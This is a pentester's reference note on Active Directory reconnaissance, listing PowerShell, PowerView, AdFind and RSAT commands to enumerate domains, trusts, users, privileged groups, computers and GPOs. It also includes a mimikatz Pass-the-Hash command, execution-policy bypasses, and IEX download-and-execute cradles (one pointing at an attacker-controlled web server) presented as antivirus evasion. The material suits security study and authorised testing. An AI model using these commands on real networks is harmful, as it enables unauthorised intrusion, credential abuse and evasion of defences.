# Active Directory - Domain Recon

### Active Directory recon tools

The tools presented below are usable through Pass-the-Hash attack using the
`sekurlsa::pth` module of `mimikatz`:

```
sekurlsa::pth /user:<USERNAME> /domain:<DOMAIN> /ntlm:<HASH> /run:<mmc.exe | powershell.exe>
```

Refer to the `Windows - Lateral movement` note, section
`Mimikatz Pass-The-Hash`, for more information.

The Microsoft `Remote Server Administration Tools (RSAT)` utilities and
PowerShell cmdlets (except for the `Group Policy Management Editor` utility)
and the PowerShell `PowerView` cmdlets can usually be used on out of domain
computer by specifying `PSCredential` object:

```
$secpasswd = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("<DOMAIN>\<USERNAME>", $secpasswd)

<RSAT_AD_CMDLET> -Credential <PSCredential> -Server <DC_HOSTNAME | DC_IP>
```

###### [GUI] Microsoft Management Console (mmc.exe)

The `Microsoft Management Console (MMC)` utility allows for the loading of
the `Remote Server Administration Tools (RSAT)` utilities, such as
`Active Directory Users and Computers (dsa.msc)` and
`Active Directory Domains and Trusts (domain.msc)`, under the same security
context, possibly obtained through Pass-the-Hash.

The process to load an utility is as follow:

```
File -> Add/Remove Snap-in (Ctrl + M) -> Selection of one or multiple chosen snap-in
```

Once the utility is loaded, the Domain Controller queried by the snap-in may
be specified by right clicking on the utility and going through the
`Change Directory Server` / `Change Active Directory Domain Controller` form.

###### [GUI] Sysinternals's AdExplorer

`Active Directory Explorer (ADExplorer)`, part of the `Sysinternals` suite, is
a standalone graphical utility that can be used to access and browse Active
Directory domains. `AdExplorer` presents the advantage of being digitally
signed by Microsoft and potentially legitimately used in the environment.
`ADExplorer` rely on the `LDAP` protocol (port `TCP` 389) by default, and
supports the `LDAPS` protocol (port `TCP` 636).

While `AdExplorer` connection prompt contains username and password fields, the
current security context is used for the connection if both fields are left
empty.

As one of it's most predominant feature, `AdExplorer` offers the ability to
take "snapshots" of the Active Directory domain, allowing for off-target /
offline viewing of Active Directory objects. For medium to large sized domains,
a snapshot can weight hundreds of megabytes to a few gigabytes.

Once connected to an Active Directory domain, the procedure to take a snapshot
is as follow:

```
File -> Create Snapshot... (or directly through the save icon)
  -> Path for the snapshot file
  -> Optional throttle to limit the usage of resource
```

`AdExplorer` snapshots can be used as an ingestor for `BloodHound` using the
[`ADExplorerSnapshot.py`](https://github.com/c3c/ADExplorerSnapshot.py) Python
script. Refer to the `[ActiveDirectory] Recon - AD scanners` note for more
information.

###### [CLI] Remote Server Administration Tools (RSAT) - PowerShell

The `Remote Server Administration Tools (RSAT)` suite includes a number of
utilities useful for Active Directory reconnaissance and notably the
`Active-Directory` module for Windows PowerShell. The `Active-Directory` module
consolidates a group of cmdlets, that can be used to retrieve information and
manage Active Directory domains. The cmdlets of `ActiveDirectory` module
rely on the `Active Directory Web Services (ADWS)` over port `TCP` 9389.

```
Import-Module ActiveDirectory
```

While the `RSAT` requires Administrator level-privileges to be installed, the
`DLL` `Microsoft.ActiveDirectory.Management.dll` can be directly imported from
an unprivileged user session. The `DLL` is usually located at the following
path:
`%SystemRoot%\Microsoft.NET\assembly\GAC_64\Microsoft.ActiveDirectory.Management\[...]`
on a system with the `RSAT` installed.

Note however that all objects properties will not be retrieval following a
direct import of **only** the `Microsoft.ActiveDirectory.Management.dll`. This
can be addressed by importing the PowerShell Active Directory `module manifest`,
with the necessary files available, after importing the module `DLL`. The files
are usually located in
`%SystemRoot%\System32\WindowsPowerShell\v1.0\Modules\ActiveDirectory\`.

Once the `DLL` has been uploaded to the target, or made accessible on a network
share, the Active Directory module can be imported:

```bash
# PowerShell Active Directory module DLL.
# Copied from %SystemRoot%\Microsoft.NET\assembly\GAC_64\Microsoft.ActiveDirectory.Management\vXXX\Microsoft.ActiveDirectory.Management.dll
Import-Module <PATH\Microsoft.ActiveDirectory.Management.dll>

# PowerShell Active Directory module manifest.
# Required files: ActiveDirectory.Format.ps1xml, ActiveDirectory.psd1, and ActiveDirectory.Types.ps1xml.
# Copied from %SystemRoot%\System32\WindowsPowerShell\v1.0\Modules\ActiveDirectory\.
Import-Module <PATH\ActiveDirectory.psd1>

# Necessary for some cmdlets, notably Get-Acl / Set-Acl - requires to be executed in a domain authenticated security context
New-PSDrive -Name AD -PSProvider ActiveDirectory -Server "<DC_IP>"
```

The [`Import-ActiveDirectory.ps1`](https://github.com/samratashok/ADModule)
PowerShell script, in-lining the `Microsoft.ActiveDirectory.Management.dll`,
may also be used to import the Active Directory module:

```
# In memory injection of the Microsoft.ActiveDirectory.Management.dll.
IEX (new-Object Net.WebClient).DownloadString('http://<WEBSERVER_IP>:<WEBSERVER_PORT>/Import-ActiveDirectory.ps1'); Import-ActiveDirectory
```

###### [CLI] PowerSploit PowerView

`PowerView` is a PowerShell tool to gain network situational awareness on
Windows domains. It contains a set of pure-PowerShell replacements for various
windows "net" commands, which utilize PowerShell AD hooks and underlying Win32
API functions to perform useful Windows domain functionality.

It also implements various useful metafunctions, including some custom-written
user-hunting functions which will identify where on the network specific users
are logged into. It can also check which machines on the domain the current
user has local administrator access on. Several functions for the enumeration
and abuse of domain trusts also exist.

The `dev` branch has the most up-to-date cmdlets:
`git clone --single-branch --branch dev https://github.com/PowerShellMafia/PowerSploit.git`

```
# PowerShell by default will not allow execution of PowerShell scripts
powershell.exe -ExecutionPolicy bypass powershell.exe
Set-ExecutionPolicy -Force -Scope CurrentUser -ExecutionPolicy Bypass

Import-Module <PATH\PowerView.ps1>
```

`PowerSploit` can trigger antivirus software. To bypass such controls, inject
it directly in memory:

```
(New-Object System.Net.WebClient).Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials

# Master fork - Stable
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')

# Empire fork - Maintained
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1')
```

`SharpView.exe` is a C# port of `PowerView` and support a number of the
`PowerView`'s cmdlets.

```
SharpView.exe <CMDLET> <LIST_ARGUMENTS>
```

###### [CLI] AdFind

`AdFind` is a command-line `C++` utility that can be used as a standalone
binary for Active Directory reconnaissance. `AdFind` implements a number of
aliases to facilitate enumeration as well as the possibility to make direct
`LDAP` query.

```
AdFind.exe <SWITCHES> [-b <BASE_DN>] [-f <LDAP_FILTER>] [<ATTRIBUTE_FILTER>]

# Example to retrieve all users' SAMAccountName and SID by querying a Global Catalog Domain Controller.
AdFind.exe -gc -list -f (objectcategory=user) sAMAccountName objectSid
```

###### [CLI] Active Directory Services Interfaces (ADSI)

`Active Directory Services Interfaces (ADSI)` is a set of interfaces built-in
the Windows operating system. The `DirectoryEntry` and `DirectorySearcher`
classes can be used on Windows system to query `AD Domain Services` with the
advantage of not requiring any additional pre-requisite or tooling.

### Active Directory forest

To retrieve forest information, the following commands can be used:

```
# PowerShell Active-Directory module
Get-ADForest
Get-ADForest -Identity <FOREST>
Get-ADForest -Current LoggedOnUser
Get-ADForest -Current LocalComputer

# SID of all domains in the current forest
(Get-ADForest).Domains | %{ Get-ADDomain -Server $_ } | Select-Object Name, DomainSID

# PowerView
Get-NetForest [[-Forest] <String>] [[-Credential] <PSCredential>]
Get-NetForest
Get-NetForest -Forest <FOREST>
```

### Active Directory domains

To retrieve domain information, the following commands can be used:

```
# CMD
echo %userdomain%
systeminfo | findstr /B /C:"Domain:"
wmic computersystem get <DOMAIN>

# PowerShell Active-Directory module
Get-ADDomain
Get-ADDomain <DOMAIN>
Get-ADDomain -Current LoggedOnUser
Get-ADDomain -Current LocalComputer

# PowerView
Get-NetDomain [[-Domain] <String>] [[-Credential] <PSCredential>]
Get-NetDomain
Get-NetDomain -Domain <DOMAIN>

# AdFind.exe
# Lists the domains in the forest.
# "domainlist:short" can be used to list the domains NetBIOS name.
AdFind.exe -sc domainlist
```

### Forest and domain trust relationships

Trust relationships define an administrative and security link between two
Windows forests or domains. They enable a user to access resources that are
located in a forest or domain that’s different from the user’s proper forest
or domain.

*Directions*

A trust relationship can be:
  - one-way, given by one forest or domain, the trusting object, to another
    domain or forest, the trusted object
  - two-way, meaning permissions extend mutually from both objects.

*Transitivity*

A transitive trust is a trust that is extended not only to the directly trusted
object, but also to each objects that the trusted object trusts.

*Default and configured trusts*

All domains in a forest trust each others by default. External trusts can also
be configured between domains of different forests.

The following different types of trusts exist in Active Directory:

| Trust type | Direction | Transitivity | Description |
|------------|-----------|--------------|-------------|
| `Parent-Child` | Two-way | Transitive | Created automatically between a child domain and its domain parent |
| `Tree-Root` | Two-way | Transitive | Created automatically when a new Tree is added to a forest |
| `Shortcut` | One-way or two-way | Transitive | Created manually to improve performance between two domains in the same forest|
| `External` <br/> `Forest` | One or two-way | Non-transitive by default | Manually created trusts between, respectively, domains of different forests or different forests |
| `Realm` | One-way or two way | Transitive or non-transitive | Manually created trusts between an Active Directory forest and a non-Windows Kerberos directory |

To retrieve the trusts affecting a forest or domain, the following commands can
be used:

```
# PowerShell - Active Directory module

# Trusts of the current domain
Get-ADTrust -Filter *
Get-ADTrust -Filter * | Ft Name, Direction, DisallowTransivity, SIDFilteringQuarantined, SIDFilteringForestAware, TGTDelegation

# All trusts in the forest
(Get-ADForest).Domains | ForEach-Object { Get-ADTrust -Server $_ -Filter * -Properties *  | Ft Name, Direction, DisallowTransivity, SIDFilteringQuarantined, SIDFilteringForestAware, TGTDelegation }

# PowerShell - PowerView
Get-ForestTrust
Get-DomainTrust

# PowerShell - BloodHound
Invoke-BloodHound -CollectionMethod trusts
Invoke-BloodHound -Domain <DOMAIN_FQDN> -CollectionMethod trusts

nltest /trusted_domains

AdFind.exe -gcb -sc trustdmp
```

### SID resolution

The PowerShell `Get-ADObject` cmdlet, of the `ActiveDirectory` module,
`PowerView`'s `ConvertFrom-SID` and `AdFind.exe` can be used to resolve the
`SID` associated with any object (user, group, computer, etc.):

```
Get-ADObject -LDAPFilter "(objectSid=<SID>)"

ConvertFrom-SID <SID>

AdFind.exe -sc adsid:<SID>
```

### Organizational Units

```
# PowerShell - Active Directory module

# Enumerates the Organizational Units in hierarchical order.
Get-ADOrganizationalUnit -Server coredc.core.cyber.local -Properties CanonicalName -Filter * | Sort-Object CanonicalName | Select-Object CanonicalName,DistinguishedName | Ft -AutoSize

# Retrieves the objects of the specified Organizational Unit.
# Users can be enumerated using Get-ADUser and computers using Get-ADComputer (instead of Get-AdObject).
Get-AdObject -Filter * -SearchBase <OU_DISTINGUISHEDNAME>

# Retrieves the number of (direct) objects in each Organizational Units.
Get-ADOrganizationalUnit -Properties CanonicalName -Filter * | Sort-Object CanonicalName |
ForEach-Object {
    [pscustomobject]@{
        CanonicalName     = $_.CanonicalName
        DistinguishedName = $_.DistinguishedName
        Count             = @(Get-AdObject -Filter * -SearchBase $_.DistinguishedName -SearchScope OneLevel).Count
    }
} | Ft -AutoSize

# ADSI / NET.

$objects = ([adsisearcher]"objectclass=organizationalunit")
$objects.PropertiesToLoad.AddRange("CanonicalName")
$objects.findall().properties.canonicalname
```

### Computers

###### Computer details

To retrieve specific computer information or list the computers in the domain,
the following commands can be used:

```
# Active-Directory module.
Get-ADComputer <IDENTITY> -Properties * # IDENTITY: Computer distinguished name (DN), GUID, SID or SamAccountName
Get-ADComputer -Filter * -Property * # All computers, all properties
Get-ADComputer -Filter * -Properties IPv4Address | FT Name,DNSHostName,IPv4Address -A
Get-ADComputer -Filter * -Property * | Export-CSV ADcomputerslist.csv -NoTypeInformation -Encoding UTF8
Get-ADComputer -Filter {(OperatingSystem -like "*windows*") -and (Enabled -eq "True")} -Properties OperatingSystem | Sort OperatingSystem | Ft DNSHostName, OperatingSystem
# EoL operating systems.
Get-ADComputer -Filter {Enabled -eq "True"} -Properties OperatingSystem | ? { $_.OperatingSystem -Match "Windows NT|Windows 2000 Server|Windows Server 2003|Windows Server 2008|Windows XP|Windows 7"} | Sort OperatingSystem | Ft DNSHostName, OperatingSystem

# PowerView.
Get-NetComputer [[-ComputerName] <String>] [[-SPN] <String>] [[-OperatingSystem] <String>] [[-ServicePack] <String>] [[-Filter] <String>] [-Printers] [-Ping] [-FullData] [[-Domain] <String>] [[-DomainController] <String>] [[-ADSpath] <String>] [[-SiteName] <String>] [-Unconstrained] [[-PageSize] <Int32>] [[-Credential] <PSCredential>]
Get-NetComputer
Get-NetComputer -FullData
Get-NetComputer -ComputerName <COMPUTERNAME>
Get-NetComputer -ComputerName <COMPUTERNAME> -Domain <DOMAIN> -DomainController <DC>
Get-NetComputer -Ping

# AdFind.exe.
# The filter below can be used to only retrieve the SAMAccountName, DNSHostName, operating system, and PrimaryGroupID of the computer objects.
AdFind.exe -f (objectcategory=computer) [sAMAccountName dNSHostName operatingSystem primaryGroupID]

# Retrieves either the active or inactive computes using the built-in aliases.
# Computers are considered active if the machine account is enabled and its password last set and lastlogontimestamp attributes are <= 90 days.
AdFind.exe -sc [computers_active | computers_inactive] [sAMAccountName dNSHostName operatingSystem primaryGroupID]
```

###### Computer search

To search for computers the following commands can be used:

```
# Active-Directory module
Get-ADComputer -Filter <FILTER> # ex: 'Description -like "*NAME*"'
Get-ADComputer -SearchBase "CN=Computers,<DOMAIN_ROOT_OBJECT>"

# PowerView
Get-NetComputer -ComputerName <COMPUTERNAME> # wildcard accepted
Get-NetComputer -SPN <SPN> # wildcard accepted
Get-NetComputer -OperatingSystem <OS> # wildcard accepted
Get-NetComputer -Filter <FILTER> # ex: "(description=*admin*)"
Get-NetComputer -ADSpath <PATH> # ex: "LDAP://OU=Computers,<DOMAIN_ROOT_OBJECT>"

# AdFind.exe
AdFind.exe -sc c:<MACHINE_SAMACCOUNTNAME>
```

###### Domain Controllers

To list the domain controllers in the current or specified domain or forest,
the following commands can be used:

```
# PowerShell ADSI.
[DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers | Select-Object Name,IPAddress

# CMD
net group "Domain Controllers" /domain
nltest /dclist:<DOMAIN>

# Active-Directory module
Get-ADDomainController -Filter *
Get-ADGroupMember 'Domain Controllers'
Get-ADComputer -LDAPFilter "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))"
(Get-ADForest).Domains | %{ Get-ADDomainController -Filter * -Server $_ } # All DC for all domains in current forest

# PowerView - returns domain controllers for the active or specified domain
Get-NetDomainController [[-Domain] <String>] [[-DomainController] <String>] [-LDAP]  [[-Credential] <PSCredential>]
Get-NetDomainController
Get-NetDomainController -Domain <DOMAIN>

# AdFind.exe
# Lists the fully qualified domain name of the Domain Controllers in the domain.
# "dclist:!rodc" / "dclist:rodc" can be used to limit the listing to, respectively, writable or read-only Domain Controllers.
AdFind.exe -sc dclist
# Enumerates all the attributes of the Domain Controllers in the domain.
AdFind.exe -sc dcdmp
```

###### Exchange servers

To list the Exchange servers of the current or specified domain or forest, the
following commands can be used:

```
Get-ADComputer -LDAPFilter "(objectCategory=msExchExchangeServer)"
AdFind.exe -f (objectCategory=msExchExchangeServer)

Get-ADGroup "Exchange Trusted Subsystem" | Get-ADGroupMember
Get-ADGroup "Exchange Trusted Subsystem" -Server <DC_IP> -Credential <PSCredential> | Get-ADGroupMember
```

###### Sites and subnets

The sites and subnets registered in Active Directory can provide information
about the network topology and physical location of computers of the
environment.

The sites and subnets can be listed, and exported in a text format, using the
`Active Directory Sites and Services` snap-in (`dssite.msc`). The snap-in can
be used for enumeration from domain-joined and non-domain joined machine.

```
File -> Add/Remove Snap-in (Ctrl + M) -> Selection of Active Directory Sites and Services
  -> Sites -> Subnets -> Right Click -> Export List...
```

The PowerShell cmdlet `Get-ADReplicationSubnet` of the `ActiveDirectory` module
can also be used to enumerate the subnets:

```
Get-ADReplicationSubnet -Server <DC_HOSTNAME | DC_IP> [-Credential <PSCredential>] -Filter * -Properties * | Select-Object Name, Site, Location, Description
```

###### ADI DNS hostnames enumeration

[`adidnsdump`](https://github.com/dirkjanm/adidnsdump) can be used to enumerate
all `DNS records` in an Active Directory domain / forest by listing the child
objects of the `DNS zones` containers and then using direct `DNS` queries to
resolve the enumerated `DNS records`. Using a direct `DNS` resolution is
required as the attributes of the `DNS record` object itself, including the
associated `IP` address, may not be accessible to any authenticated users,
while the name of the record (and thus the corresponding hostname) is.

Leveraging `DNS` records instead of retrieving the `dNSHostName` attribute of
machine account objects provide the advantage of allowing enumeration of
systems that may have a DNS entry in the domain but are not directly joined to
it.

```bash
# -r: resolve DNS records for which the associated IP address was not accessible with LDAP query through direct DNS queries.
adidnsdump -u <DOMAIN>\\<USERNAME> [--print-zones | -r] <DC_HOSTNAME>
```

###### Network scan

AD queries can be used in combination with a network scan tool, such as nmap,
to quickly identity computers running specific services.

Example for quickly gathering the servers and computers running SMB, which
could be used for lateral movement:

```
Get-ADComputer -Server <DC> -Filter  * | Ft DNSHostName | Out-File -filepath <ADOUTFILE>
nmap -v -p 445 -oG nmap_ad_servers_445.gnmap -iL <ADOUTFILE>
grep Up nmap_ad_servers_445.gnmap | cut -d ' ' -f 2 > <ADOUTFILE445>
```

### Users

###### User details

To retrieve specific user information or list the users in the domain, the
following commands can be used:

```
# Active-Directory module
Get-ADUser <IDENTITY> -Properties * # IDENTITY: User distinguished name (DN), GUID, SID or SamAccountName
Get-ADUser -Filter * -SearchBase "OU=Finance,OU=UserAccounts,DC=FABRIKAM,DC=COM"
Get-ADUser -Filter 'Name -like "*SvcAccount"' | Format-Table Name,SamAccountName -A

Get-ADUser -Properties * -Filter 'SIDHistory -like "*"'

# Users that can have an empty password (may be overwritten by a GPO): "useraccountcontrol"'s "PASSWD_NOTREQD" field set to "True".
Get-ADUser -LDAPFilter "(&(objectCategory=Person)(objectClass=User)(userAccountControl:1.2.840.113556.1.4.803:=32))"

# PowerView
Get-NetUser [[-Identity] <String>] [-Domain <String>] [-Server <String>] [-ADSpath <String>] [-Filter <String>] [-SPN] [-AdminCount] [-Unconstrained] [-AllowDelegation] []

# IDENTITY: SamAccountName, DistinguishedName, SID, GUID, or wildcard.
Get-NetUser -Identity <IDENTITY>
Get-NetUser -Domain <DOMAIN> -Server <DC_IP | DC_HOSTNAME> -Credential <PSCredential> -Identity <IDENTITY>

Get-NetUser -ADSpath "LDAP://<DISTINGUISHEDNAME>"

# FILTER example: "(description=*admin*)".
Get-NetUser -Filter <FILTER>
# Enabled users.
Get-NetUser -Filter "(!userAccountControl:1.2.840.113556.1.4.803:=2)"
# Users that do not require Smart Card authentication.
Get-NetUser -Filter "(!useraccountcontrol:1.2.840.113556.1.4.803:=262144)"

# AdFind.exe
AdFind.exe -f (objectcategory=user)
AdFind.exe -list -f (objectcategory=person) sAMAccountName
```

###### User search

To search for users the following commands can be used:

```
# Active-Directory module - Get-ADUser
Get-ADUser -Filter 'Name -like "*SvcAccount"' | Format-Table Name,SamAccountName -A
Get-ADUser -Filter * -SearchBase "OU=Finance,OU=UserAccounts,<DOMAIN_ROOT_OBJECT>"

# PowerView - Get-NetUser
Get-NetUser -Identity <USERNAME> # wildcard accepted
Get-NetUser -Filter <FILTER> # ex: "(description=*admin*)"
Get-NetUser -ADSpath "LDAP://OU=secret,DC=testlab,DC=local"

# AdFind.exe
AdFind.exe -sc u:<SAMACCOUNTNAME>
```

###### Enterprise and Domain Admins

The following queries list the `Domain Administrators` and / or the current and
past privileged users (users that have their `adminCount` attribute set to `1`)
of the domain:

```
# CMD
# dsquery / dsget require the RSAT to be installed on the system.
dsquery group -name "Domain Admins" | dsget group -members -expand
# net group enumerates Global security group while net
net group "<GROUPNAME>  " /domain

# Privileged users
Get-ADUser -LDAPFilter "(objectcategory=person)(samaccountname=*)(admincount=1)"

# Members of the "Enterprise Admins" group. EA group name may vary.
Get-ADGroupMember -Identity "Enterprise Admins" -Recursive

# Members of the "Domain Admins" group. DA group name may vary.
Get-ADGroupMember "Domain Admins" -Recursive

# PowerView
Get-NetUser -AdminCount # users with adminCount=1.

# AdFind.exe
AdFind.exe -sc admincountdmp
```

To check if the current user is a Domain Admin, a listing of the "C:" drive of
a domain controller can be attempted:

```
dir \\<DC>\C$
```

###### Privileged users

The PowerShell script below can be used to list the members of the privileged
domain groups.

The members of these groups can ultimately compromise the domain. Refer to the
`[ActiveDirectory] Operators to Domain Admins` note for more information on the
privilege escalation possibilities.

```
# Targeted privileged groups: "Domain Admins" (-512), "Enterprise Admins" (-519), "Administrators" (-544), "Backup Operators" (-551), "DNS Admins" (> 1000), "Print Operators" (-550), "Server Operators" (-549), "Account Operators" (-548), "Schema Admins" (-518)

$ForestSID = (Get-ADForest).RootDomain | %{ (Get-ADDomain -Server $_).DomainSID }
$DomainSID = (Get-ADDomain).DomainSID

$EnterpriseAdminsSID = New-Object System.Security.Principal.SecurityIdentifier ([System.Security.Principal.WellKnownSidType]::AccountEnterpriseAdminsSid, $ForestSID)
$DomainAdminsSID = New-Object System.Security.Principal.SecurityIdentifier ([System.Security.Principal.WellKnownSidType]::AccountDomainAdminsSid, $DomainSID)
$AdministratorsSID = New-Object System.Security.Principal.SecurityIdentifier ([System.Security.Principal.WellKnownSidType]::BuiltinAdministratorsSid, $DomainSID)
$BackupOperatorsSID = New-Object System.Security.Principal.SecurityIdentifier ([System.Security.Principal.WellKnownSidType]::BuiltinBackupOperatorsSid,$DomainSID)
$DnsAdminsSID = (Get-ADGroup -Identity "DnsAdmins").SID
$PrintOperatorsSID = New-Object System.Security.Principal.SecurityIdentifier ([System.Security.Principal.WellKnownSidType]::BuiltinPrintOperatorsSid,$DomainSID)
$ServerOperatorsSID = New-Object System.Security.Principal.SecurityIdentifier ([System.Security.Principal.WellKnownSidType]::BuiltinSystemOperatorsSid,$DomainSID)
$AccountOperatorsSID = New-Object System.Security.Principal.SecurityIdentifier ([System.Security.Principal.WellKnownSidType]::BuiltinAccountOperatorsSid,$DomainSID)
$SchemaAdminsSID = New-Object System.Security.Principal.SecurityIdentifier ([System.Security.Principal.WellKnownSidType]::AccountSchemaAdminsSid,$DomainSID)

Get-ADGroup -Filter {(SID -eq $DomainAdminsSid) -or (SID -eq $EnterpriseAdminsSID) -or (SID -eq $AdministratorsSID) -or (SID -eq $BackupOperatorsSID) -or (SID -eq $DnsAdminsSID) -or (SID -eq $PrintOperatorsSID) -or (SID -eq $ServerOperatorsSID) -or (SID -eq $AccountOperatorsSID) -or (SID -eq $SchemaAdminsSID)} | Get-ADGroupMember -Recursive | Sort-Object | Get-Unique
```

### Groups

###### Enumerate groups

The following commands can be used to enumerate the domain groups and the
members of a specific group:

```
# CMD
net group /domain

# Active-Directory module
# IDENTITY: Group distinguished name (DN), GUID, SID or SamAccountName
Get-ADGroup -Filter *
Get-ADGroup -Identity <IDENTITY>
Get-ADGroup -Identity <IDENTITY> -Properties member | Select-Object -expandProperty member
Get-ADGroup -Filter 'GroupCategory -eq "Security" -and GroupScope -ne "DomainLocal"'
Get-ADGroup -SearchBase "OU=secret,<DOMAIN_ROOT_OBJECT>"

Get-ADGroupMember -Recursive -Identity <IDENTITY>

# PowerView
Get-NetGroup [[-GroupName] <String>] [[-SID] <String>] [[-UserName] <String>] [[-Filter] <String>] [[-Domain] <String>] [[-DomainController] <String>] [[-ADSpath] <String>] [-AdminCount] [-FullData] [[-Credential] <PSCredential>]
Get-NetGroup -GroupName <GROUPNAME> # supports wildcards
Get-NetGroup -Filter <FILTER> # example: "(description=*admin*)" / "(description=*<USERNAME>*)"
Get-NetGroup -GroupName *admin* -AdminCount
Get-NetGroup -ADSpath <PATH> # example: "LDAP://OU=secret,DC=testlab,DC=local"
```

###### User's groups

The following commands can be used to retrieve the groups the specified user is
member of:

```
# Active-Directory module
Get-ADPrincipalGroupMembership <IDENTITY> # IDENTITY: Group distinguished name (DN), GUID, SID or SamAccountName
Get-ADUser <IDENTITY> | Get-ADPrincipalGroupMembership
Get-ADUser -Server <DC> <IDENTITY> | Get-ADPrincipalGroupMembership
Get-ADPrincipalGroupMembership <IDENTITY> | Where-Object {$_.name -like '*adm*'}

# PowerView
Get-NetGroup -UserName <USERNAME>
```

###### Local groups

The following commands can be used to enumerate the local groups on a specific
computer:

```
# PowerView
Get-NetLocalGroup [[-ComputerName] <String[]>] [-ComputerFile <String>] [-GroupName <String>] [-ListGroups] [-Recurse] [<CommonParameters>]
Get-NetLocalGroup -ListGroups -Recurse
Get-NetLocalGroup # Defaults to list the members of the "Administrators" groups
Get-NetLocalGroup  -GroupName <GROUPNAME> # Query the users of the specified local group
```

### Unconstrained Kerberos delegation

The following commands can be used to retrieve the computers and service account
making uses of unconstrained Kerberos delegation:

```
# Unconstrained Delegation: TrustedForDelegation = True
# Constrained Delegation: TrustedToAuthForDelegation = True
# Domain Computers: primaryGroupID = 515 (516 & 521 are used for Domain Controllers)

Get-ADComputer -Filter {(TrustedForDelegation -eq $True) -and (PrimaryGroupID -eq 515)} -Properties ServicePrincipalName,TrustedForDelegation,TrustedToAuthForDelegation,Description
```

### Search by Security Identifier

Active Directory objects can be searched by their `Security Identifier (SID)`
using the following PowerShell cmdlets:

```
Get-ADObject -Filter "objectSid -eq '<SID>'"
```

### Group Policy (GPO)

The `Grouper2` C# application can be used to enumerate a number of sensible
parameters as well as access rights on the GPO object themselves and the
associated GPO files (in the `SYSVOL` directory of Domain Controllers):

```
Grouper2.exe -g -f <OUTPUT_HTML_FILE>
Grouper2.exe -d "<DOMAIN>" -u "<USERNAME>" -p "<PASSWORD>" -s "\\<DC_HOSTNAME | DC_IP>\SYSVOL" -g -f <OUTPUT_HTML_FILE>
```

The following PowerShell script can be used to generate `XML` and `HTML`
reports of all the `GPO` defined in the current domain:

```
$OutputFolder = "<OUTPUT_FOLDER>"

$GpoList = Get-GPO -All
foreach ($GPO in $GpoList){
    Get-GPO -GUID $GPO.id
    Get-GPOReport -GUID $GPO.id -ReportType XML -Path "$OutputFolder\$($GPO.DisplayName).xml"
    Get-GPOReport -GUID $GPO.id -ReportType HTML -Path "$OutputFolder\$($GPO.DisplayName).html"
}
```

--------------------------------------------------------------------------------

### References

https://www.alitajran.com/get-organizational-units-with-powershell/
